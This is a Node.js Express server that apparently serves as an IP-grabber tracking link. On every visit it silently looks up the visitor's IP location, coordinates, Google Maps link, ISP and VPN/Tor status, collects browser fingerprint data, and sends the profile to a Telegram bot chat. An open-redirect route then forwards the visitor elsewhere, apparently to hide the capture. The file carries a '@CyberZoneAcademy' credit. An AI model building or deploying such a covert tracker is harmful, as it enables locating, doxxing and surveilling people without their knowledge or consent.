require('dotenv').config();
const express = require('express');
const useragent = require('useragent');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = 3000;

// Tokens and keys from environment variables
const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
const IPQUALITYSCORE_KEY = process.env.IPQUALITYSCORE_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.set('trust proxy', true);
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Function to get client IP using various methods
const getClientIp = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] || 
           req.headers['cf-connecting-ip'] || 
           req.headers['fastly-client-ip'] || 
           req.headers['x-cluster-client-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           req.connection.socket?.remoteAddress;
};

// Function to send messages to Telegram in HTML format
const sendToTelegram = async (message) => {
    console.log("Sending message to Telegram:", message);
    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error("Error sending message to Telegram:", error.message);
        if (error.response && error.response.data) console.error(error.response.data);
    }
};

app.use(async (req, res, next) => {
    const clientIp = getClientIp(req);
    req.clientIp = clientIp;
    console.log("Client IP:", clientIp);

    const agent = useragent.parse(req.headers['user-agent']);
    let ipInfo = {};
    let privacyInfo = {};

    try {
        const response = await axios.get(`https://ipinfo.io/${clientIp}/json?token=${IPINFO_TOKEN}`);
        ipInfo = response.data;
    } catch (error) {
        console.error("Error fetching IP info:", error.message);
    }

    try {
        const privacyResponse = await axios.get(`https://ipqualityscore.com/api/json/ip/${IPQUALITYSCORE_KEY}/${clientIp}`);
        privacyInfo = privacyResponse.data;
    } catch (error) {
        console.error("Error fetching privacy info:", error.message);
    }

    const latitude = ipInfo.loc ? ipInfo.loc.split(',')[0] : 'Unknown';
    const longitude = ipInfo.loc ? ipInfo.loc.split(',')[1] : 'Unknown';
    const gmapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const message = `
<b>Client Info:</b>
- 🏷 <b>IP Address:</b> ${clientIp}
- 📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
- 📍 <b>Coordinates:</b> ${ipInfo.loc || 'Unknown'} (Latitude: ${latitude}, Longitude: ${longitude})
- 🌐 <b>Google Maps:</b> <a href="${gmapLink}">View Location</a>
- 🏢 <b>Organization:</b> ${ipInfo.org || 'Unknown'}
- 🏤 <b>Postal Code:</b> ${ipInfo.postal || 'Unknown'}
- 🕒 <b>Timezone:</b> ${ipInfo.timezone || 'Unknown'}
- 🖥 <b>User-Agent:</b> ${req.headers['user-agent']}
- 📱 <b>Operating System:</b> ${agent.os.toString()}
- 🌐 <b>Browser:</b> ${agent.toAgent()}
- 📱 <b>Device:</b> ${agent.device.toString()}

<b>Privacy Info:</b>
- 🔒 <b>Is Proxy:</b> ${privacyInfo.proxy ? 'Yes' : 'No'}
- 🔒 <b>Is VPN:</b> ${privacyInfo.vpn ? 'Yes' : 'No'}
- 🔒 <b>Is TOR:</b> ${privacyInfo.tor ? 'Yes' : 'No'}
- 🔒 <b>Is Residential:</b> ${privacyInfo.residential ? 'Yes' : 'No'}
- 🔒 <b>Is Public Proxy:</b> ${privacyInfo.public_proxy ? 'Yes' : 'No'}
- 🔒 <b>Is Hosting Provider:</b> ${privacyInfo.hosting ? 'Yes' : 'No'}

<b>Credit Info:</b>
💻 @CyberZoneAcademy
`;

    await sendToTelegram(message);
    next();
});

app.post('/log-client-info', async (req, res) => {
    const clientInfo = req.body;

    if (!clientInfo) {
        return res.status(400).send("No client information received");
    }

    const message = `
<b>Client Screen & Browser Info:</b>
- 🖥 <b>Screen Resolution:</b> ${clientInfo.screenWidth}x${clientInfo.screenHeight}
- 🎨 <b>Color Depth:</b> ${clientInfo.colorDepth}
- 📏 <b>Pixel Depth:</b> ${clientInfo.pixelDepth}
- 🌐 <b>Browser Language:</b> ${clientInfo.browserLanguage}
- 📱 <b>Platform:</b> ${clientInfo.platform}
- 🖥 <b>User-Agent:</b> ${clientInfo.userAgent}
- 🍪 <b>Cookies Enabled:</b> ${clientInfo.cookieEnabled}
`;

    await sendToTelegram(message);
    res.sendStatus(200);
});

// Serve the index.html from the public directory
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Redirect route
app.get('/source', (req, res) => {
    const redirectUrl = req.query.redirect || 'https://www.google.com';
    console.log("Redirecting to:", redirectUrl);
    res.redirect(redirectUrl);
});

// Global error handler
app.use((err, req, res, next) => {
    console.error("Unhandled error:", err.message);
    res.status(500).send("Internal Server Error");
    process.exit(1); // Force restart on critical error
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

// Graceful shutdown and restart on unhandled rejections
process.on('unhandledRejection', (error) => {
    console.error("Unhandled Rejection:", error);
    process.exit(1);
});
process.on('uncaughtException', (error) => {
    console.error("Uncaught Exception:", error);
    process.exit(1);
});